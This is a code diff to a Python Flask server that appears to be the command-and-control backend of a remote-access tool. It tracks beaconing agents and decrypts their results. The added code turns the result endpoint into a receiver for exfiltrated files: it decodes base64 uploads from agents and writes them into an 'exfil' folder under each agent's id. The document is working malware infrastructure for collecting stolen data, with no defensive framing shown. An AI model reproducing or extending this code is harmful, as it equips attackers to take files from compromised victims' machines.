@@ -1,6 +1,8 @@
 from flask import Flask, request, jsonify
 from common.cryptography_helpers import encrypt_string, decrypt_string
 import time
+import os
+import base64
 import json
 
 app = Flask(__name__)
@@ -8,6 +10,9 @@ app = Flask(__name__)
 tasks = {} #in-memory task list
 agents = {}
 AGENT_TIMEOUT = 60
+
+EXFIL_DIR = "exfil"
+os.makedirs(EXFIL_DIR, exist_ok = True)
 
 
 @app.route('/api/status', methods=['POST']) # old /beacon
@@ -39,11 +44,38 @@ def status():
 def result():
     agent_id = request.json.get('id')
     output = request.json.get('output')
+    MAX_EXFIL_SIZE = 5 * 1024 * 1024 # 5 MB Max
     try:
             plaintext = decrypt_string(output)
-            print(f"[+] Result from {agent_id}: {plaintext}")
-    except Exception:
-        print("[!] Decryption failed")
+            data = json.loads(plaintext)
+     
+            if data.get("status") == "success" and "data" in data and "filename" in data:
+                
+                encoded_data = data["data"]
+                
+                if len(encoded_data) > MAX_EXFIL_SIZE * 2 :
+                    print("[!] Exfil rejected: encoded payload too large")
+                    return jsonify({"status": "received"})
+                
+
+                file_bytes = base64.b64decode(encoded_data, validate=True)
+                if len(file_bytes) > MAX_EXFIL_SIZE:
+                    print("[!] Exfil rejected: file too large")
+                    return jsonify({"status": "received"}) 
+                
+                
+                filename = os.path.basename(data["filename"])
+                save_path = os.path.join(EXFIL_DIR, f"{agent_id}_{filename}")
+                
+                
+                with open(save_path, "wb") as f:
+                    f.write(file_bytes)
+                    
+                print(f"[+] Exfil saved to {save_path}")
+            else:
+                print(f"[+] Result from {agent_id} : {data}")
+    except Exception as e :
+        print("[!] Upload processing failed: {e}")
     return jsonify({"status": "received"})
 
 
